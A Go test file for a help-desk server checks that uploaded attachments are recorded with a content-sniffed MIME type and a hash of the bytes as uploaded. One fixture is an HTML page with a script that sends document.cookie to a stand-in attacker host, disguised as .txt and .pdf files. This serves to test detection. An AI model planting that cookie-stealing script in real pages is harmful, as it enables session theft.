package server_test

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"io/fs"
	"math/rand"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/publiciallc/go-help-desk/backend/internal/domain/ticket"
)

// What the help desk records about an upload, as opposed to what the uploader
// claimed about it.
//
// Two facts, both taken from the bytes that arrived: what the content is, and
// what it hashes to. Neither one blocks an upload. Since attachments are
// served as an opaque blob and nothing renders them, a file that is not what
// its name says is not a risk to this server — it is a risk to the person who
// is about to open it, and the only thing we can do for them is say so.
//
// The reason this needs a test at all is that the old check had a default
// branch: magicOK ended in `return true`, so any extension without a hard-coded
// signature — .txt and .log then, anything an operator adds later — was never
// looked at.

// TestUpload_RecordsWhatTheContentActuallyIs covers both directions at once:
// the files that must be described accurately, and the ordinary ones that must
// not be described as something they are not.
//
// It reads the values back through the list endpoint rather than trusting the
// 201 body, because an implementation that works out the answer and forgets to
// store it would return the right JSON from the handler and leave a NULL row —
// and a NULL means "nobody checked this file", which is the one thing that
// must not be said about a file that was checked.
func TestUpload_RecordsWhatTheContentActuallyIs(t *testing.T) {
	h, cleanup := newHarness(t)
	defer cleanup()

	cases := []struct {
		name         string
		filename     string
		content      []byte
		wantDetected string // media type, parameters ignored
	}{
		{
			name:         "a PDF named .pdf",
			filename:     "report.pdf",
			content:      detPDF(),
			wantDetected: "application/pdf",
		},
		{
			// Go's own sniffer answers application/zip here, which would flag
			// every Word document anyone attaches. A warning that fires on
			// ordinary files is one staff learn to click past.
			name:         "a DOCX named .docx",
			filename:     "contract.docx",
			content:      detDOCX(t),
			wantDetected: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
		},
		{
			name:         "an XLSX named .xlsx",
			filename:     "inventory.xlsx",
			content:      detXLSX(t),
			wantDetected: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
		},
		{
			// Log text has no signature at all, which is exactly why the old
			// check skipped it and why it has to be recorded as what it is
			// rather than as what the filename said.
			name:         "log text named .log",
			filename:     "printer.log",
			content:      detLogText(),
			wantDetected: "text/plain",
		},
		{
			name:         "plain text named .txt",
			filename:     "notes.txt",
			content:      detLogText(),
			wantDetected: "text/plain",
		},
		{
			// The gap this step closes. The upload is still accepted — a 201,
			// not a refusal — but the instance now knows, and can say, that
			// the file called notes.txt is a web page with script in it.
			name:         "HTML named .txt",
			filename:     "notes.txt",
			content:      detHTML(),
			wantDetected: "text/html",
		},
		{
			// The same deception under a name that carries more trust. The
			// old check caught this one by its missing "%PDF" and refused it;
			// the settled design records it and lets it through, because
			// legitimate mismatches exist and nothing here renders.
			name:         "HTML named .pdf",
			filename:     "invoice.pdf",
			content:      detHTML(),
			wantDetected: "text/html",
		},
		{
			name:         "a JPEG named .jpg",
			filename:     "photo.jpg",
			content:      detJPEG(t),
			wantDetected: "image/jpeg",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tk, err := h.ticketSvc.Create(context.Background(), ticket.CreateInput{
				Subject: tc.name, Description: "x", CategoryID: h.catID,
				ReporterUserID: &h.staffID,
			})
			require.NoError(t, err)

			res := uploadNamed(t, h, tk.ID.String(), tc.filename, tc.content)
			defer res.Body.Close()
			require.Equal(t, http.StatusCreated, res.StatusCode,
				"a mismatch is recorded and shown, never blocked: legitimate ones exist "+
					"and nothing renders an attachment")

			stored := listAttachments(t, h, tk.ID.String())
			require.Len(t, stored, 1)
			got := stored[0]

			require.NotNil(t, got.DetectedMime,
				"null means nobody looked at this file, which is a different fact "+
					"from finding nothing wrong with it")
			media, _, err := mime.ParseMediaType(*got.DetectedMime)
			require.NoError(t, err, "detected_mime %q does not parse", *got.DetectedMime)
			require.Equal(t, tc.wantDetected, media,
				"%s was recorded as %q", tc.filename, *got.DetectedMime)

			require.NotNil(t, got.SHA256, "the hash identifies the sample; it is not optional")
			require.Equal(t, hexSHA256(tc.content), *got.SHA256,
				"the hash must be of the bytes that arrived")
		})
	}
}

// TestUpload_HashAndTypeAreOfTheBytesAsUploaded is the case that decides what
// both columns mean.
//
// An uploaded image is recompressed before it is written, so for images — and
// only for images — "the bytes" is ambiguous. Both fields answer the same
// question, which is what did this person actually send us: that is what an
// analyst looks up, and what a chain-of-custody record has to state. The hash
// of our re-encoded copy answers a question nobody asked.
//
// The consequence is deliberate and has to be stated in the UI rather than
// discovered: for a recompressed image the stored file's hash is not this
// hash. The test asserts that difference rather than tolerating it, so an
// implementation that hashes after recompression fails here instead of
// quietly producing a value that looks plausible.
func TestUpload_HashAndTypeAreOfTheBytesAsUploaded(t *testing.T) {
	h, cleanup := newHarness(t)
	defer cleanup()

	tk, err := h.ticketSvc.Create(context.Background(), ticket.CreateInput{
		Subject: "As uploaded", Description: "x", CategoryID: h.catID,
		ReporterUserID: &h.staffID,
	})
	require.NoError(t, err)

	// Noise, so the recompression is guaranteed to change the bytes: a flat
	// image encodes to almost nothing either way and the comparison below
	// would prove nothing.
	sent := detPNG(t)

	res := uploadNamed(t, h, tk.ID.String(), "screenshot.png", sent)
	defer res.Body.Close()
	require.Equal(t, http.StatusCreated, res.StatusCode)

	stored := listAttachments(t, h, tk.ID.String())
	require.Len(t, stored, 1)
	got := stored[0]

	require.NotNil(t, got.SHA256)
	require.Equal(t, hexSHA256(sent), *got.SHA256,
		"the recorded hash must be of the PNG the user sent, not of what we re-encoded")

	require.NotNil(t, got.DetectedMime)
	media, _, err := mime.ParseMediaType(*got.DetectedMime)
	require.NoError(t, err)
	require.Equal(t, "image/png", media,
		"detection runs on the bytes as uploaded, before recompression")

	// And the file on disk is a different file, which is the whole reason the
	// distinction matters. Without this, an implementation that hashed after
	// recompression could still pass if recompression happened to be a no-op.
	onDisk := theOnlyStoredFile(t, h)
	require.NotEqual(t, *got.SHA256, hexSHA256(onDisk),
		"this upload was recompressed, so the stored bytes differ from the uploaded "+
			"bytes; if these match, the hash was taken from the wrong side of it")
}

// TestUpload_HashOfANonImageMatchesTheFileOnDisk is the other half of the same
// rule. Nothing rewrites a non-image, so for every attachment except a
// recompressed picture the recorded hash is also the hash of the stored file —
// and a chain-of-custody record that only sometimes describes the artefact on
// disk is not one.
func TestUpload_HashOfANonImageMatchesTheFileOnDisk(t *testing.T) {
	h, cleanup := newHarness(t)
	defer cleanup()

	tk, err := h.ticketSvc.Create(context.Background(), ticket.CreateInput{
		Subject: "On disk", Description: "x", CategoryID: h.catID,
		ReporterUserID: &h.staffID,
	})
	require.NoError(t, err)

	sent := detPDF()
	res := uploadNamed(t, h, tk.ID.String(), "report.pdf", sent)
	defer res.Body.Close()
	require.Equal(t, http.StatusCreated, res.StatusCode)

	stored := listAttachments(t, h, tk.ID.String())
	require.Len(t, stored, 1)
	require.NotNil(t, stored[0].SHA256)

	require.Equal(t, hexSHA256(sent), *stored[0].SHA256)
	require.Equal(t, hexSHA256(theOnlyStoredFile(t, h)), *stored[0].SHA256,
		"nothing rewrites a PDF, so the recorded hash is the hash of the stored file")
}

// detectedAttachment is the part of the attachment JSON these tests read.
// Pointers, because null and "" are different answers: null is a file nobody
// inspected.
type detectedAttachment struct {
	Filename     string  `json:"filename"`
	MimeType     string  `json:"mime_type"`
	DetectedMime *string `json:"detected_mime"`
	SHA256       *string `json:"sha256"`
}

func listAttachments(t *testing.T, h *harness, ticketID string) []detectedAttachment {
	t.Helper()
	res := h.do(t, http.MethodGet, "/api/v1/tickets/"+ticketID+"/attachments", nil)
	defer res.Body.Close()
	require.Equal(t, http.StatusOK, res.StatusCode)
	var out []detectedAttachment
	require.NoError(t, json.NewDecoder(res.Body).Decode(&out))
	return out
}

// theOnlyStoredFile returns the bytes of the single file under the harness's
// attachment directory. Walked rather than reconstructed from the layout the
// handler happens to use, so it keeps working — and keeps being meaningful —
// if that layout changes.
func theOnlyStoredFile(t *testing.T, h *harness) []byte {
	t.Helper()
	var found []string
	require.NoError(t, filepath.WalkDir(h.attachDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.Type().IsRegular() {
			found = append(found, path)
		}
		return nil
	}))
	require.Len(t, found, 1, "expected exactly one stored file under %s", h.attachDir)
	b, err := os.ReadFile(found[0])
	require.NoError(t, err)
	return b
}

func hexSHA256(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// --- Fixtures. Real files, not invented magic bytes: a four-byte prefix would
// only prove the detector reads four bytes. ---

func detNoisyImage(w, h int, seed int64) image.Image {
	r := rand.New(rand.NewSource(seed))
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := range h {
		for x := range w {
			img.Set(x, y, color.RGBA{
				R: uint8(r.Intn(256)), G: uint8(r.Intn(256)), B: uint8(r.Intn(256)), A: 255,
			})
		}
	}
	return img
}

func detPNG(t *testing.T) []byte {
	t.Helper()
	var b bytes.Buffer
	require.NoError(t, png.Encode(&b, detNoisyImage(128, 128, 1)))
	return b.Bytes()
}

func detJPEG(t *testing.T) []byte {
	t.Helper()
	var b bytes.Buffer
	require.NoError(t, jpeg.Encode(&b, detNoisyImage(128, 128, 2), nil))
	return b.Bytes()
}

func detPDF() []byte {
	return []byte("%PDF-1.4\n" +
		"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n" +
		"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n" +
		"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\n" +
		"trailer<</Root 1 0 R>>\n%%EOF\n")
}

func detOOXML(t *testing.T, entries [][2]string) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for _, e := range entries {
		w, err := zw.Create(e[0])
		require.NoError(t, err)
		_, err = w.Write([]byte(e[1]))
		require.NoError(t, err)
	}
	require.NoError(t, zw.Close())
	return b.Bytes()
}

func detDOCX(t *testing.T) []byte {
	t.Helper()
	return detOOXML(t, [][2]string{
		{"[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`},
		{"_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`},
		{"word/document.xml", `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body></w:document>`},
	})
}

func detXLSX(t *testing.T) []byte {
	t.Helper()
	return detOOXML(t, [][2]string{
		{"[Content_Types].xml", `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>`},
		{"_rels/.rels", `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>`},
		{"xl/workbook.xml", `<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1"/></sheets></workbook>`},
		{"xl/worksheets/sheet1.xml", `<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData/></worksheet>`},
	})
}

func detHTML() []byte {
	return []byte("<!DOCTYPE html>\n<html><head><title>Invoice</title></head>" +
		"<body><script>fetch('//evil.example/'+document.cookie)</script></body></html>\n")
}

func detLogText() []byte {
	return []byte("2026-09-23 12:00:01 INFO  printer queue drained\n" +
		"2026-09-23 12:00:02 WARN  toner low\n")
}
